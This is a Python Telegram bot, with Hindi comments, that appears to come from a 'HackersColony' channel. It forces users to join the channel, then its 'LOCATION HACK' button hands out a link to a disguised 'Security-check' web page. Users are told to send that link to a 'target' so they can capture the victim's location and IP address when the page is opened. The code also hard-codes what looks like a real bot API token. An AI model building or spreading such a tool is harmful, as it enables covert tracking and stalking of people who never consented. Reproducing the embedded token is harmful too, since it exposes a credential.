import telebot
from telebot import types

# --- सेटअप (यहाँ अपनी जानकारी भरें) ---
API_TOKEN = '7607380112:AAFqTInE7pX0N_3A76uF85nS_m0_8_jH8uM' # अपना असली टोकन यहाँ पेस्ट करें
bot = telebot.TeleBot(API_TOKEN)

# चैनल का यूजरनेम (बिना @ के)
CHANNEL_ID = 'HackersColony' 
# आपकी GitHub वाली लोकेशन ट्रैकिंग लिंक
WEBSITE_URL = "https://roshan0786shah.github.io/Security-check-/"

# --- फंक्शन: चैनल जॉइन चेक करने के लिए ---
def check_sub(user_id):
    try:
        status = bot.get_chat_member(f"@{CHANNEL_ID}", user_id).status
        return status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"Error checking sub: {e}")
        return False

# --- कमांड: /start ---
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    if check_sub(user_id):
        # अगर यूजर ने जॉइन किया है
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("🚀 LOCATION HACK")
        btn2 = types.KeyboardButton("🤖 CONTACT ADMIN")
        btn3 = types.KeyboardButton("📢 BROADCAST")
        markup.add(btn1, btn2)
        markup.add(btn3)
        
        bot.send_message(message.chat.id, f"✅ Welcome back {user_name}!\nSelect your tool from the keyboard below:", reply_markup=markup)
    else:
        # अगर जॉइन नहीं किया है
        markup = types.InlineKeyboardMarkup()
        join_btn = types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_ID}")
        check_btn = types.InlineKeyboardButton("🔄 I joined", callback_data="check")
        markup.add(join_btn)
        markup.add(check_btn)
        
        bot.send_message(message.chat.id, "❌ Access Denied!\nYou must join our channel to use this bot.", reply_markup=markup)

# --- बटन क्लिक चेक करने के लिए ---
@bot.callback_query_handler(func=lambda call: call.data == "check")
def check_callback(call):
    if check_sub(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Thank you for joining!")
        start(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ You haven't joined @HackersColony yet!", show_alert=True)

# --- बटन: LOCATION HACK ---
@bot.message_handler(func=lambda message: message.text == "🚀 LOCATION HACK")
def loc_hack(message):
    msg = (
        "⚒ Tool Generated Successfully!\n\n"
        "Copy and send this link to your target. You will get their Location & IP once they open it.\n\n"
        f"🔗 Your Link: {WEBSITE_URL}"
    )
    bot.send_message(message.chat.id, msg)

# --- बॉट को चालू रखना (Render के लिए) ---
if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
      
